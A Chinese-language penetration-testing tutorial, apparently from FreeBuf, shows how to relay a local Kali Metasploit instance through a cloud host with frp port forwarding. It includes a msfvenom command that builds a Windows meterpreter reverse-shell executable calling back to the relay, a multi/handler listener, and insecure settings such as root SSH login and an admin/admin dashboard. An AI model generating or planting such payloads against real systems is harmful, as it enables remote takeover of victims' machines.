![低成本打造一个高性能的外网metasploit](https://image.3001.net/images/20180328/15222514194311.png)

## 前言

 **经常用Metasploit反弹shell的小伙伴应该都知道在外网有
一台Metasploit是一件多么奢侈的事情~然而一台性能不错的云主机价格大都不菲，并且自己本地高性能的Metasploit用的那么顺手可惜就是没有外网IP。所以这篇文章就此诞生了，利用云主机的独立IP，将本地的Metasploit端口转发到外网上面去。**

## 云服务器选购

考虑到低延迟等特性，买一台`国内`普通的云主机就可以了。云主机的话腾讯云有学生特惠价，蛮便宜的。

![低成本打造一个高性能的外网metasploit](https://image.3001.net/images/20180327/15221421854125.png)

活动地址是：<https://cloud.tencent.com/act/campus?fromSource=gwzcw.786783.786783.786783>

本次是在`CentOS`下面搭建的，所以选好服务器后，安装一个CentOS系统即可。

## 安利一个终端

### [MobaXterm](https://mobaxterm.mobatek.net/download.html)

>   * 支持滑动复制
>   * 支持命令行高亮
>   * 免费版功能够用
>   * 支持SSH、Telnet、Rsh、Xdmcp、RDP、VNC、FTP、SFTP、Serial、Mosh、Aws S3等主流协议
>

界面如下：

![低成本打造一个高性能的外网metasploit](https://image.3001.net/images/20180327/15221428421307.png)

## 搭建环境准备

>   * frps部署机,centos7为例,有外网固定ip,假设ip为1.1.1.1,后文简称`frps`
>   * frpc客户机,kali 2.0为例,能访问互联网,后文简称`frpc`
>

## CentOS的配置

### 下载frp

Github项目地址:<https://github.com/fatedier/frp>

找到最新的[releases](https://github.com/fatedier/frp/releases)下载，系统版本自行确认。

    
    
    [root@sqlsec ~]> wget https://github.com/fatedier/frp/releases/download/v0.16.1/frp_0.16.1_linux_amd64.tar.gz
    
    [root@sqlsec ~]> tar -zxvf frp_0.16.1_linux_amd64.tar.gz
    
    [root@sqlsec ~]> cd frp_0.16.1_linux_amd64/
    
    [root@sqlsec frp_0.16.1_linux_amd64/]> rm -rf frpc*
    

### 编写frps配置文件

    
    
    [root@sqlsec frp_0.16.1_linux_amd64/]> vi frps.ini
    

内容如下：

    
    
    [common]
    bind_port = 7000
    dashboard_port = 7500
    dashboard_user = admin
    dashboard_pwd = admin
    

>   * 第1行为frps和frpc之间通讯端口
>   * 第2行为监控页面web地址
>   * 第3.4行为监控页面密码
>

文末会展示其效果。

### 运行frps

运行frps,`-c`参数用于指定配置文件,在同级目录下的话 可以直接运行`.frps`

    
    
    ./frps -c frps.ini
    

![低成本打造一个高性能的外网metasploit](https://image.3001.net/images/20180327/15221581586363.png)

## Kali的配置

### 配置SSH

 **允许root远程登陆**

编辑ssh配置文件`/etc/ssh/sshd_config`

    
    
    root@kali:~ vim /etc/ssh/sshd_config
    

在配置文件第一行前添加如下语句:

    
    
    PermitRootLogin yes
    

![低成本打造一个高性能的外网metasploit](https://image.3001.net/images/20180328/15222000023813.png)

**重启ssh并设置为开机自启**

    
    
    root@kali:~ systemctl restart ssh
    root@kali:~ systemctl enable ssh
    

**验证SSH**

本地使用终端连接虚拟机中的Kali，测试能否连接成功:

![低成本打造一个高性能的外网metasploit](https://image.3001.net/images/20180328/15222003258224.png)

### 下载frp

    
    
    root@kali:~> wget https://github.com/fatedier/frp/releases/download/v0.16.1/frp_0.16.1_linux_amd64.tar.gz
    
    root@kali:~> tar -zxvf frp_0.16.1_linux_amd64.tar.gz
    
    root@kali:~> cd frp_0.16.1_linux_amd64/
    
    root@kali:~/frp_0.16.1_linux_amd64> rm -rf frps*
    

> 注这里最后一句是`rm -rf frps*`与CentOS下操作的最后一句不相同。

### 编写frpc配置文件

    
    
    root@kali:~/frp_0.16.1_linux_amd64> vi frpc.ini
    

内容如下：

    
    
    #frps的ip和端口
    [common]
    server_addr = 1.1.1.1
    server_port = 7000
    
    # kali ssh的配置
    [ssh]
    type = tcp
    local_ip = 127.0.0.1
    local_port = 22
    remote_port = 10086
    use_compression = true
    

这里的`remote_port = 10086`是将Kali的22端口映射到外网IP`1.1.1.1`的`10086`端口的意思。

### 运行frpc

`-c`参数用于指定配置文件,在同级目录下的话 可以直接运行`.frpc`

    
    
    ./frpc -c frpc.ini
    

![低成本打造一个高性能的外网metasploit](https://image.3001.net/images/20180328/15222018941783.png)

## SSH连接测试

    
    
    λ ssh root@1.1.1.1 -p 10086
    

成功！美滋滋~~![](https://image.3001.net/images/20180328/1522202433734.jpg)

![低成本打造一个高性能的外网metasploit](https://image.3001.net/images/20180328/15222026172590.png)

## msf反向shell测试

回到正题现在来进行Metasploit下最基本的反向shell测试，看看能不能成功建立会话连接。

### 生成Payload

 **使用msfvenom生成exe木马**

    
    
    root@kali:~> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=2333 -f exe > sqlsec.exe
    

> 32位系统的payload语句调整为:windows/meterpreter/reverse_tcp

这里的`1.1.1.1`是外网云主机的IP地址，`2333`是映射到外网的端口

![低成本打造一个高性能的外网metasploit](https://image.3001.net/images/20180328/15222305354649.png)

将生成的`shell.exe`拷贝到一台Windows机器上准备运行。

### 添加frpc规则

    
    
    root@kali:~/frp_0.16.1_linux_amd64> vi frpc.ini
    

修改为如下内容：

    
    
    [common]
    server_addr = 1.1.1.1
    server_port = 7000
    
    [ssh]
    type = tcp
    local_ip = 127.0.0.1
    local_port = 22
    remote_port = 10086
    
    [msf]
    type = tcp
    local_ip = 127.0.0.1
    local_port = 4444
    remote_port = 2333
    

将Kali的`4444`端口转发到外网`1.1.1.1`的`2333`端口。

### 运行frps和frpc

分别在`CentOS`和`Kali`下运行`frps`和`frpc`。

![低成本打造一个高性能的外网metasploit](https://image.3001.net/images/20180328/1522206238724.png)

### msf监听反弹的shell

    
    
    msf > use exploit/multi/handler
    
    msf exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
    PAYLOAD => windows/x64/meterpreter/reverse_tcp
    
    msf exploit(multi/handler) > set LHOST 127.0.0.1
    LHOST => 127.0.0.1
    
    msf exploit(multi/handler) > set LPORT 4444
    LPORT => 4444
    
    msf exploit(multi/handler) > run
    

> 注：32位目标系统这里做如下调整:set PAYLOAD windows/meterpreter/reverse_tcp

然后就开始监听本地的`4444`端口了，这个时候在Windows下运行`sqslec.exe`，Kali这边成功拿到反弹的shell会话:

![低成本打造一个高性能的外网metasploit](https://image.3001.net/images/20180328/15222308598187.gif)

在浏览器中输入`[<http://1.1.1.1:7500>](<http://1.1.1.1:7500>)`用户名和密码都是前面设置的`admin`，然后就直接进入了`dashboard`界面，可以更直观的观察到端口转发监听的情况：

![低成本打造一个高性能的外网metasploit](https://image.3001.net/images/20180328/15222310848641.png)

## 结语

frp可以说是神器级别的工具了，向开发者致敬，关于frp更多高级有趣的用法只能等大家自己探索了，溜了溜了~~

 ***本文作者：国光，转载请注明来自 FreeBuf.COM**

